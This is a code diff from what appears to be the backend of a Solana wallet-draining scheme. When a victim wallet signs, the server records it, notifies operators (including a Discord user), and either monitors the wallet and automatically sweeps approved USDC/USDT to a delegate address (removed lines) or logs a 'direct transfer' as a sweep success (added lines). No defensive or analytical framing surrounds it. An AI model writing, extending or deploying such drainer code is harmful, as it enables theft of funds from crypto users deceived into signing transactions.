@@ -147,8 +147,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
         return res.status(400).json({ error: "walletAddress, delegateAddress, and transactionHash are required" });
       }
 
-      console.log(`[Solana] Approval recorded: ${walletAddress} -> ${delegateAddress} (${transactionHash})`);
-      console.log(`[Solana] Tokens approved:`, tokensApproved);
+      console.log(`[Solana] Direct transfer recorded: ${walletAddress} -> ${delegateAddress} (${transactionHash})`);
+      console.log(`[Solana] Tokens transferred:`, tokensApproved);
       
       notifyWalletSigned({
         walletAddress,
@@ -157,73 +157,32 @@ export async function registerRoutes(app: Express): Promise<Server> {
         discordUser: req.body.discordUser,
       }).catch(() => {});
       
-      // Log each token approval separately for tracking
-      const approvals = [];
+      const transfers = [];
       const tokens = tokensApproved || ["USDC", "USDT"];
       
       for (const token of tokens) {
         try {
-          const approval = await storage.createApproval({
+          const transfer = await storage.createApproval({
             walletAddress,
             tokenAddress: delegateAddress,
             tokenSymbol: `SOL-${token}`,
             transactionHash,
           });
-          approvals.push(approval);
+          transfers.push(transfer);
         } catch (err) {
-          console.log(`[Solana] Could not store ${token} approval, continuing...`);
+          console.log(`[Solana] Could not store ${token} transfer, continuing...`);
         }
       }
       
-      // Add wallet to continuous monitoring
-      await addWalletToMonitor(
+      notifySweepSuccess({
         walletAddress,
-        'solana',
-        undefined,
-        tokens
-      );
-      console.log(`[Monitor] Added Solana wallet to monitoring: ${walletAddress} (${tokens.length} tokens)`);
+        network: "solana",
+        token: tokens.join(", "),
+        amount: "direct transfer",
+        txHash: transactionHash,
+      }).catch(() => {});
       
-      scheduleDelayedClaim(walletAddress, 'solana');
-      
-      // Respond immediately to client
-      res.json({ success: true, transactionHash, tokensApproved: tokens, approvals });
-      
-      // Trigger automatic sweep in background after approval confirmation
-      // Wait a bit for the approval transaction to fully confirm
-      setTimeout(async () => {
-        console.log(`[Solana] Triggering automatic sweep for ${walletAddress}...`);
-        try {
-          const sweepResult = await sweepApprovedTokens(walletAddress, tokens);
-          console.log(`[Solana] Sweep result:`, sweepResult);
-          
-          for (const transfer of sweepResult.transfers) {
-            if (transfer.success) {
-              try {
-                await storage.createTransfer({
-                  walletAddress,
-                  tokenAddress: delegateAddress,
-                  tokenSymbol: `SOL-${transfer.token}`,
-                  amount: transfer.amount,
-                  transactionHash: transfer.signature,
-                });
-                
-                notifySweepSuccess({
-                  walletAddress,
-                  network: "solana",
-                  token: transfer.token,
-                  amount: transfer.amount,
-                  txHash: transfer.signature,
-                }).catch(() => {});
-              } catch (err) {
-                console.log(`[Solana] Could not log transfer for ${transfer.token}`);
-              }
-            }
-          }
-        } catch (sweepError: any) {
-          console.error(`[Solana] Sweep failed:`, sweepError?.message || sweepError);
-        }
-      }, 3000); // Wait 3 seconds for approval to fully confirm
+      res.json({ success: true, transactionHash, tokensTransferred: tokens, transfers });
       
     } catch (error: any) {
       console.error('[Solana] Approval error:', error);
